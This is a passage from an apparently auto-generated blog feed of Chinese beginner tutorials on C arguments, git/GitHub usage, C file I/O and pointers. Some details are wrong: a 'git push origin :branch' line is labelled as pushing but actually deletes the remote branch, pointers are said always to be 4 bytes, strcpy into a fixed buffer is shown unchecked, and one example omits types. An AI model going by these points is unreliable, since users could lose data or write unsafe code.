        <content type="html"><![CDATA[<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><h4 id="char-转int"><a href="#char-转int" class="headerlink" title="char * 转int"></a>char * 转int</h4><pre class=" language-bash"><code class="language-bash">int main<span class="token punctuation">(</span>int argc,char * argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>int a <span class="token operator">=</span> atoi<span class="token punctuation">(</span>argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="char-转char"><a href="#char-转char" class="headerlink" title="char * 转char[]"></a>char * 转char[]</h4><pre class=" language-bash"><code class="language-bash"> char a<span class="token punctuation">[</span>100<span class="token punctuation">]</span><span class="token punctuation">;</span> strcpy<span class="token punctuation">(</span>a,argv<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github</title>
      <link href="/2019/08/14/github-1/"/>
      <url>/2019/08/14/github-1/</url>
      
        <content type="html"><![CDATA[<h1 id="github"><a href="#github" class="headerlink" title="github"></a>github</h1><p>使用github托管项目</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h4 id="仓库-Repository"><a href="#仓库-Repository" class="headerlink" title="仓库(Repository)"></a>仓库(Repository)</h4><p>仓库用来存放项目代码，每个项目对应一个仓库，多个开源项目则有多个仓库</p><h4 id="复制克隆项目-Fork"><a href="#复制克隆项目-Fork" class="headerlink" title="复制克隆项目(Fork)"></a>复制克隆项目(Fork)</h4><p><img src="https://pic.downk.cc/item/5fcb0b62394ac523781ec307.png" alt=""></p><blockquote><p>该fork项目是独立存在的</p></blockquote><h4 id="发起请求-Pull-Request"><a href="#发起请求-Pull-Request" class="headerlink" title="发起请求(Pull Request)"></a>发起请求(Pull Request)</h4><p>此操作是基于fork的，如上图，如果李四在test仓库上做了改进，想把自己的改进合并进原有的项目里(张三的test仓库)，此时李四就可以发起一个Pull Request(PR)，此时原有项目创建人(张三)就会收到这个请求，张三review并测试后，就可以接受李四的PR,此时原有项目(张三的test仓库)就会拥有李四进行改进的部分</p><h4 id="事务卡片-Issue"><a href="#事务卡片-Issue" class="headerlink" title="事务卡片(Issue)"></a>事务卡片(Issue)</h4><p>发现代码Bug,但是目前没有成型的代码，需要讨论时用。即别人发现你项目中有bug，或者哪些地方不够好，他就可以给你提Issue，然后你看到这些问题可以去逐个修复，修复完毕就可以close掉。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>创建github账号后进行下列操作</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://ae01.alicdn.com/kf/Hf14a7f5422eb4a5eb562161de97907ffJ.jpg" alt=""></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://ae01.alicdn.com/kf/Hdee80294a41d4c2db6498f2eb1d77637d.jpg" alt=""></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://ae01.alicdn.com/kf/H161165f125044121bd68b2989e2ff3bdM.jpg" alt=""></p><h3 id="仓库主页"><a href="#仓库主页" class="headerlink" title="仓库主页"></a>仓库主页</h3><p><img src="https://ae01.alicdn.com/kf/Hd1a094cd869240afabf8c2c8c116efb9y.jpg" alt=""></p><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h2 id="git工作区域"><a href="#git工作区域" class="headerlink" title="git工作区域"></a>git工作区域</h2><h3 id="Git-Repository-git仓库"><a href="#Git-Repository-git仓库" class="headerlink" title="Git Repository(git仓库)"></a>Git Repository(git仓库)</h3><p>最终确定的文件保存到仓库，成为一个新的版本</p><h3 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h3><p>暂存已经修改的文件最后统一提交到git仓库中</p><h3 id="工作区-wroking-directory"><a href="#工作区-wroking-directory" class="headerlink" title="工作区(wroking directory)"></a>工作区(wroking directory)</h3><p>添加、编辑、修改文件等操作</p><p><img src="https://pic.downk.cc/item/5fcc6aac394ac5237832132b.png" alt=""></p><h3 id="提交流程"><a href="#提交流程" class="headerlink" title="提交流程"></a>提交流程</h3><p>工作区—&gt;暂存区—&gt;git仓库 </p><p>下图中将hello.php和test.php文件传到Git仓库中</p><p><img src="https://pic.downk.cc/item/5fcc6b8f394ac5237832b2c4.png" alt=""></p><blockquote><p>git status为查看当前状态</p></blockquote><h2 id="仓库与分支-branch"><a href="#仓库与分支-branch" class="headerlink" title="仓库与分支(branch)"></a>仓库与分支(branch)</h2><h3 id="获取远程Git仓库"><a href="#获取远程Git仓库" class="headerlink" title="获取远程Git仓库"></a>获取远程Git仓库</h3><pre><code>git clone 项目地址</code></pre><p>上述命令会新建一个一项目命名的新目录，进入此目录后，我们可以看见一个包含远程项目的拷贝，我们把这个拷贝叫做working tree，还有一个叫做.git的目录，.git目录中包含了此项目的所有历史信息。</p><h3 id="切换不同版本的项目"><a href="#切换不同版本的项目" class="headerlink" title="切换不同版本的项目"></a>切换不同版本的项目</h3><p>git存储了项目的所有历史版本，这些版本在Git中被称为commit。</p><p>这些历史快照commit不一定都按照从最早到最新的顺序排列在同一行中；在git中，工作可以按着并行的算法（称为分支branch）进行，分支可以合并merge和分叉diverge。</p><h4 id="git-branch"><a href="#git-branch" class="headerlink" title="git-branch"></a>git-branch</h4><p>单个git仓库可以跟踪多个分支上的开发，它通过保留引用每个分支上的最新提交的头(heads)表来实现，git-branch 命令可以向你展示分支头的列表(branch heads)</p><pre><code>git branch</code></pre><p><img src="https://pic.downk.cc/item/5fcc7aff394ac523783d4d0b.png" alt=""></p><blockquote><p>此命令需在.git文件夹的同级目录上执行</p></blockquote><h2 id="git初始化-将文件上传到github"><a href="#git初始化-将文件上传到github" class="headerlink" title="git初始化(将文件上传到github"></a>git初始化(将文件上传到github</h2><p>git安装完成后点击右键后再点Git Bash Here在终端窗口中输入下列命令</p><h3 id="基本信息设置"><a href="#基本信息设置" class="headerlink" title="基本信息设置"></a>基本信息设置</h3><pre class=" language-bash"><code class="language-bash">1、设置用户名<span class="token function">git</span> config --global user.name <span class="token string">"用户名"</span>2、设置用户名邮箱<span class="token function">git</span> config --global user.email <span class="token string">"邮箱地址"</span></code></pre><blockquote><p>注：该设置在github仓库主页显示谁提交了该文件</p></blockquote><h3 id="初始化git-创建git仓库"><a href="#初始化git-创建git仓库" class="headerlink" title="初始化git(创建git仓库)"></a>初始化git(创建git仓库)</h3><ol><li>在要上传的文件夹的根目录下打开git bash后输入命令<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> 文件夹名<span class="token function">git</span> init</code></pre></li><li>将文件提交到暂存区<pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> add 文件名</code></pre></li></ol><blockquote><p>注：若想提交文件夹中所有文件则使用命令git add .</p></blockquote><ol start="3"><li><p>将文件从暂存区提交到仓库</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> commit -m <span class="token string">"描述"</span></code></pre><p>描述内容根据个人需要进行输入，描述内容在github的显示如下<br><img src="https://ae01.alicdn.com/kf/Hc62dfe7f8b1f4855a4086a4fecb3cf32p.jpg" alt=""></p></li><li><p>查看暂存区文件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> status   //若出现nothing to commit证明提交成功</code></pre></li><li><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> remote add origin github项目地址</code></pre><p>github项目地址<br><img src="https://ae01.alicdn.com/kf/H931645851e3a4e189265eb074f211259r.jpg" alt=""></p></li><li><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push origin master</code></pre></li></ol><h2 id="提交代码至远端并合并"><a href="#提交代码至远端并合并" class="headerlink" title="提交代码至远端并合并"></a>提交代码至远端并合并</h2><ol><li><p>在本地新建一个分支dev(git add&amp;&amp;git commit后才有效)</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> branch dev</code></pre></li><li><p>查看分支</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> branch re</code></pre><ol start="3"><li><p>切换到本地分支进行文件上传</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> checkout dev  //切换到dev分支<span class="token function">git</span> add <span class="token keyword">.</span>  //上传文件夹内的所有文件到dev分支里<span class="token function">git</span> commit -m <span class="token string">'注释'</span></code></pre></li><li><p>切换到远程分支master并进行操作</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> checkout master<span class="token function">git</span> pull //拉取远程分支Master中的最新代码<span class="token function">git</span> merge dev<span class="token function">git</span> push</code></pre></li></ol><p>刷新分支 显示远程分支</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> fetch</code></pre><p>重置 </p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> reset</code></pre><p>传到远程固定分支上</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push origin :远程分支名</code></pre><h2 id="传到远程固定分支"><a href="#传到远程固定分支" class="headerlink" title="传到远程固定分支"></a>传到远程固定分支</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone 项目地址<span class="token function">git</span> fetch <span class="token comment" spellcheck="true">#更新分支</span><span class="token function">git</span> branch -a <span class="token comment" spellcheck="true">#查看远程是否有目标分支</span><span class="token function">git</span> checkout -b dev   <span class="token comment" spellcheck="true">#新建分支</span>-----进行开发------<span class="token function">git</span> add 文件名<span class="token function">git</span> commit -m “你想说的注释”<span class="token function">git</span> push -u origin dev:远程分支</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(六)</title>
      <link href="/2019/08/13/c-6/"/>
      <url>/2019/08/13/c-6/</url>
      
        <content type="html"><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ul><li>文件的定义：文件是一组有关数据的有序集合</li><li>操作系统是以文件为单位对数据进行管理的</li></ul><h2 id="文件的分类"><a href="#文件的分类" class="headerlink" title="文件的分类"></a>文件的分类</h2><h3 id="从用户观点"><a href="#从用户观点" class="headerlink" title="从用户观点"></a>从用户观点</h3><h4 id="特殊文件-标准输入输出文件或标准设备文件"><a href="#特殊文件-标准输入输出文件或标准设备文件" class="headerlink" title="特殊文件(标准输入输出文件或标准设备文件)"></a>特殊文件(标准输入输出文件或标准设备文件)</h4><h4 id="普通文件-磁盘文件"><a href="#普通文件-磁盘文件" class="headerlink" title="普通文件(磁盘文件)"></a>普通文件(磁盘文件)</h4><h3 id="从操作系统的角度看"><a href="#从操作系统的角度看" class="headerlink" title="从操作系统的角度看"></a>从操作系统的角度看</h3><p>从操作系统的角度看，每一个与主机相连的输入、输出设备都看作是一个文件</p><h3 id="按数据的组织形式"><a href="#按数据的组织形式" class="headerlink" title="按数据的组织形式"></a>按数据的组织形式</h3><h4 id="ASCII文件-文本文件"><a href="#ASCII文件-文本文件" class="headerlink" title="ASCII文件(文本文件)"></a>ASCII文件(文本文件)</h4><p>每一个字节放一个ASCII代码</p><h4 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h4><p>把内存的数据按其在内存中的存储形式原样输出到磁盘上存放</p><h2 id="C语言对文件的处理"><a href="#C语言对文件的处理" class="headerlink" title="C语言对文件的处理"></a>C语言对文件的处理</h2><h3 id="缓冲文件系统"><a href="#缓冲文件系统" class="headerlink" title="缓冲文件系统"></a>缓冲文件系统</h3><p>系统自动地在内存区为每一个正在使用的文件开辟一个缓冲区。用缓冲文件系统进行的输出输入又称为高级磁盘输出输入。</p><h3 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h3><p>系统不自动开辟确定大小的缓冲区，而由程序为每个文件设定缓冲区。用非缓冲文件系统进行的输出输入又称为低级输入输出系统。</p><blockquote><p>注： 在ANSI C标准中只采用缓冲文件系统来处理文本文件和二进制文件，C语言对文件的读写都是用库函数实现的</p></blockquote><h2 id="文件的基本操作"><a href="#文件的基本操作" class="headerlink" title="文件的基本操作"></a>文件的基本操作</h2><h3 id="文件型指针型变量"><a href="#文件型指针型变量" class="headerlink" title="文件型指针型变量"></a>文件型指针型变量</h3><pre class=" language-c"><code class="language-c">FILE <span class="token operator">*</span> fp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//fp是一个指向FILE类型结构体的指针变量</span></code></pre><h3 id="FILE类型的数组"><a href="#FILE类型的数组" class="headerlink" title="FILE类型的数组"></a>FILE类型的数组</h3><p>FILE f[5];定义了一个结构体数组f，可以用来存放5个文件的信息</p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><pre class=" language-c"><code class="language-c">FILE <span class="token operator">*</span> fp<span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>文件名，使用文件方式<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//文件名加上路径</span></code></pre><h4 id="文件使用方式"><a href="#文件使用方式" class="headerlink" title="文件使用方式"></a>文件使用方式</h4><ul><li><font color="#fb8c00">r</font>  (只读)为输入打开一个文本文件</li><li><font color="#fb8c00">w</font>  (只写)为输出打开一个文本文件</li><li><font color="#fb8c00">a</font>  (追加)向文本文件尾增加数据</li><li><font color="#fb8c00">rb</font>  (只读)为输入打开一个二进制文件</li><li><font color="#fb8c00">wb</font>  (只写)为输出打开一个二进制文件</li><li><font color="#fb8c00">ab</font>  (追加)向二进制文件尾增加数据</li><li><font color="#fb8c00">r+</font>  (读写)为读/写打开一个文本文件</li><li><font color="#fb8c00">w+</font>  (读写)为读/写建立一个新的文本文件</li><li><font color="#fb8c00">a+</font>  (读写)为读/写打开一个文本文件</li><li><font color="#fb8c00">rb+</font>  (读写)为读/写打开一个二进制文件</li><li><font color="#fb8c00">wb+</font>  (读写)为读/写建立一个新的二进制文件</li><li><font color="#fb8c00">ab+</font>  (读写)为读/写打开一个二进制文件</li></ul><blockquote><p>注： 1. 凡是”r”打开一个文件时，该文件必须已经存在，且只能从该文件中读出<br>       2. 用”w”打开的文件只能向该文件中写入，若打开的文件不存在，则以指定的文件名建立该文件，若文件已存在，则将该文件删除，重建一个新文件<br>       3. 若要向一个已存在的文件追加新的信息，只能用”a”的方式打开文件。但此时该文件必须是存在的，否则会出错。<br>       4. 用只写或读写方式打开一个已存在文件时将清除原文件的内容，写入字符从文件首开始。如需保留原有文件内容，希望写入的字符以文件末开始存放，必须以追加的方式打开文件，被写入的文件若不存在，则创建该文件。</p></blockquote><h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><pre class=" language-c"><code class="language-c"><span class="token function">fclose</span><span class="token punctuation">(</span>文件指针<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使文件指针变量不再指向该文件，若成功返回0，否则返回-1</span></code></pre><h3 id="文件的读写操作"><a href="#文件的读写操作" class="headerlink" title="文件的读写操作"></a>文件的读写操作</h3><h4 id="字符输入输出函数"><a href="#字符输入输出函数" class="headerlink" title="字符输入输出函数"></a>字符输入输出函数</h4><h5 id="fputc"><a href="#fputc" class="headerlink" title="fputc()"></a>fputc()</h5><pre class=" language-c"><code class="language-c"><span class="token function">fputc</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将字符(ch的值)输出到fp所指的文件中去</span></code></pre><blockquote><p>注：</p></blockquote><h5 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc()"></a>fgetc()</h5><pre class=" language-c"><code class="language-c">ch <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//从打开的文件fp中读取一个字符并送入ch中</span></code></pre><blockquote><p>注：1. 在fgetc()函数调用中，读取的文件必须是以读或写的方式打开的<br>      2.使用fgetc()函数后，该位置指针(文件内部指针,与文件指针不同)向后移动一个字节，因此可连续多次使用fgetc()函数读取多个字符 </p></blockquote><h4 id="字符串读写函数"><a href="#字符串读写函数" class="headerlink" title="字符串读写函数"></a>字符串读写函数</h4><h5 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h5><h5 id="fputs"><a href="#fputs" class="headerlink" title="fputs()"></a>fputs()</h5><pre class=" language-c"><code class="language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*定义一个最大长度为19, 末尾是'\0'的字符数组来存储字符串*/</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入一个字符串:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*从输入流stdin中读取19个字符到字符数组str中*/</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将字符数组的内容输出到输出流stdout中</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：stdin/stdout是标准输入/输出流，即屏幕输入/输出</p></blockquote><h4 id="数据块读写函数"><a href="#数据块读写函数" class="headerlink" title="数据块读写函数"></a>数据块读写函数</h4><h5 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h5><h5 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a>fwrite()</h5><h4 id="格式化读写函数"><a href="#格式化读写函数" class="headerlink" title="格式化读写函数"></a>格式化读写函数</h4><h5 id="fscanf"><a href="#fscanf" class="headerlink" title="fscanf()"></a>fscanf()</h5><h5 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf()"></a>fprintf()</h5><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fscanf</span> <span class="token punctuation">(</span> FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">fprintf</span> <span class="token punctuation">(</span> FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//举例</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> ch<span class="token punctuation">;</span><span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%d %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"%d %c"</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(五)</title>
      <link href="/2019/08/09/c-5/"/>
      <url>/2019/08/09/c-5/</url>
      
        <content type="html"><![CDATA[<h2 id="指针的概念"><a href="#指针的概念" class="headerlink" title="指针的概念"></a>指针的概念</h2><p>指针就是内存中的地址，地址是内存单元的编号</p><pre class=" language-bash"><code class="language-bash">int * p<span class="token punctuation">;</span>//p是变量的名字，int *表示p变量存放的是int类型变量的地址<span class="token punctuation">(</span>int *是p变量的数据类型<span class="token punctuation">)</span>int i <span class="token operator">=</span>3<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span>//p保存的是i的地址，因此p指向i，p的值与i的值互不影响</code></pre><blockquote><p>注：如果一个指针变量指向了某个普通变量，则* 指针变量就完全等同于普通变量</p></blockquote><pre class=" language-bash"><code class="language-bash">int * p<span class="token punctuation">;</span>int i <span class="token operator">=</span>3<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span>j <span class="token operator">=</span> *p<span class="token punctuation">;</span>//*p相当于i,所以j<span class="token operator">=</span>i//结果为 j <span class="token operator">=</span>3//*p就是以p的内容为地址的变量</code></pre><h2 id="指针和指针变量"><a href="#指针和指针变量" class="headerlink" title="指针和指针变量"></a>指针和指针变量</h2><p>指针是地址，指针变量是存放地址的变量，指针和指针变量是两个不同的概念，但是叙述时会把指针变量简称为指针，实际它们含义不一样。</p><h3 id="一个指针变量占几个字节"><a href="#一个指针变量占几个字节" class="headerlink" title="一个指针变量占几个字节"></a>一个指针变量占几个字节</h3><p><font color="#fb8c00">sizeof(数据类型)</font>：返回值是该数据类型所占的字节数<br><font color="#fb8c00">sizeof(变量名)</font>：返回值是该变量所占的字节数</p><pre class=" language-bash"><code class="language-bash">sizeof<span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token operator">=</span>4   sizeof<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token operator">=</span>1 sizeof<span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token operator">=</span>8</code></pre><ul><li>假设p指向char类型的变量(1个字节)</li><li>假设q指向int类型的变量(4个字节)</li><li>假设r指向double类型的变量(8个字节)</li><li>pqr大小均为4个字节(pqr只存地址的第一个字节，但CPU与内存间有32根地址线，地址表示位有32位)</li></ul><blockquote><p>注：一个指针变量，无论它指向的变量占几个字节，该指针变量本身只占四个字节</p></blockquote><h2 id="多级指针"><a href="#多级指针" class="headerlink" title="多级指针"></a>多级指针</h2><pre class=" language-bash"><code class="language-bash">int i <span class="token operator">=</span>10<span class="token punctuation">;</span>int * p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span>int ** q <span class="token operator">=</span> <span class="token operator">&amp;</span>p<span class="token punctuation">;</span>//q是存放int*类型变量的地址的指针int *** r <span class="token operator">=</span> <span class="token operator">&amp;</span>q<span class="token punctuation">;</span>//r是存放int**类型变量的地址的指针r <span class="token operator">=</span> <span class="token operator">&amp;</span>p<span class="token punctuation">;</span>//error,r只能存放int**类型的变量的地址</code></pre><h2 id="指针的分类"><a href="#指针的分类" class="headerlink" title="指针的分类"></a>指针的分类</h2><h3 id="基本类型指针"><a href="#基本类型指针" class="headerlink" title="基本类型指针"></a>基本类型指针</h3><pre class=" language-bash"><code class="language-bash">int * p<span class="token punctuation">;</span>int i<span class="token operator">=</span>5<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span></code></pre><blockquote><p>注：在C语言中NULL指针定义为0</p></blockquote><h4 id="基本类型指针的常见错误分析"><a href="#基本类型指针的常见错误分析" class="headerlink" title="基本类型指针的常见错误分析"></a>基本类型指针的常见错误分析</h4><pre class=" language-bash"><code class="language-bash">int * p<span class="token punctuation">;</span>int i <span class="token operator">=</span>5<span class="token punctuation">;</span>* p <span class="token operator">=</span>i<span class="token punctuation">;</span>//error,相当于将p指针指向的int变量赋值成i，但p指针指向的int变量的控制权限并没有分配给本程序</code></pre><pre class=" language-bash"><code class="language-bash">int i <span class="token operator">=</span>5<span class="token punctuation">;</span>int * p<span class="token punctuation">;</span>int * q<span class="token punctuation">;</span>p <span class="token operator">=</span><span class="token operator">&amp;</span>i<span class="token punctuation">;</span>//* q <span class="token operator">=</span>p<span class="token punctuation">;</span>//error,*q为int类型，而p为int*类型//* q <span class="token operator">=</span> *p<span class="token punctuation">;</span>//error</code></pre><blockquote><p>注：q的空间是属于本程序的，所以本程序可以读写q的内容，但如果q的内部是垃圾值，则本程序不能读写* q的内容，因为* q所代表的内存单元的控制权限并没有分配给本程序</p></blockquote><h3 id="指针和数组"><a href="#指针和数组" class="headerlink" title="指针和数组"></a>指针和数组</h3><h4 id="指针和一维数组"><a href="#指针和一维数组" class="headerlink" title="指针和一维数组"></a>指针和一维数组</h4><h5 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h5><p>一维数组名是一个指针常量，存放的是第一个元素的地址</p><h5 id="下标和指针的关系"><a href="#下标和指针的关系" class="headerlink" title="下标和指针的关系"></a>下标和指针的关系</h5><p>如果p是个指针变量，则p[i]永远等价于* （p+i）</p><pre class=" language-bash"><code class="language-bash">//通过函数输出数组的内容void pArr<span class="token punctuation">(</span>int * p,int len<span class="token punctuation">)</span><span class="token punctuation">{</span>    //p为数组名，len为数组大小    //a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>*<span class="token punctuation">(</span>a+0<span class="token punctuation">)</span>,a<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token operator">=</span>*<span class="token punctuation">(</span>a+2<span class="token punctuation">)</span>    for<span class="token punctuation">(</span>int i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>        printf<span class="token punctuation">(</span><span class="token string">"%d"</span>,*<span class="token punctuation">(</span>p+i<span class="token punctuation">))</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    printf<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>    a<span class="token punctuation">[</span>4<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>1,2,3,4<span class="token punctuation">}</span><span class="token punctuation">;</span>    b<span class="token punctuation">[</span>6<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>1,2,3,4,5,6<span class="token punctuation">}</span><span class="token punctuation">;</span>    c<span class="token punctuation">[</span>100<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>1,2,34<span class="token punctuation">}</span><span class="token punctuation">;</span>    pArr<span class="token punctuation">(</span>a,4<span class="token punctuation">)</span><span class="token punctuation">;</span>    pArr<span class="token punctuation">(</span>b,6<span class="token punctuation">)</span><span class="token punctuation">;</span>    pArr<span class="token punctuation">(</span>c,100<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h5 id="指针变量的运算"><a href="#指针变量的运算" class="headerlink" title="指针变量的运算"></a>指针变量的运算</h5><ul><li>指针变量不能相加，不能相乘，不能相除</li><li>如果两个指针变量指向的是同一块连续空间中的不同存储单元，则这两个指针变量可以相减<pre class=" language-bash"><code class="language-bash">int i <span class="token operator">=</span>5<span class="token punctuation">;</span>int j <span class="token operator">=</span>10<span class="token punctuation">;</span>int * p <span class="token operator">=</span><span class="token operator">&amp;</span>i<span class="token punctuation">;</span>int * q <span class="token operator">=</span><span class="token operator">&amp;</span>j<span class="token punctuation">;</span>p-q<span class="token punctuation">;</span>//没有实际意义</code></pre><pre class=" language-bash"><code class="language-bash">int a<span class="token punctuation">[</span>5<span class="token punctuation">]</span><span class="token punctuation">;</span>int * p<span class="token punctuation">;</span>int * q<span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">;</span>q <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>4<span class="token punctuation">]</span><span class="token punctuation">;</span>printf<span class="token punctuation">(</span><span class="token string">"p和q所指向单元相隔%d个单元\n"</span>,p-q<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="指针和二维数组"><a href="#指针和二维数组" class="headerlink" title="指针和二维数组"></a>指针和二维数组</h4><h3 id="指针和函数"><a href="#指针和函数" class="headerlink" title="指针和函数"></a>指针和函数</h3><h4 id="通过被调函数修改主调函数普通变量的值"><a href="#通过被调函数修改主调函数普通变量的值" class="headerlink" title="通过被调函数修改主调函数普通变量的值"></a>通过被调函数修改主调函数普通变量的值</h4><pre class=" language-bash"><code class="language-bash">int g<span class="token punctuation">(</span>int * i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    *i <span class="token operator">=</span> 1<span class="token punctuation">;</span>    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span><span class="token punctuation">)</span> 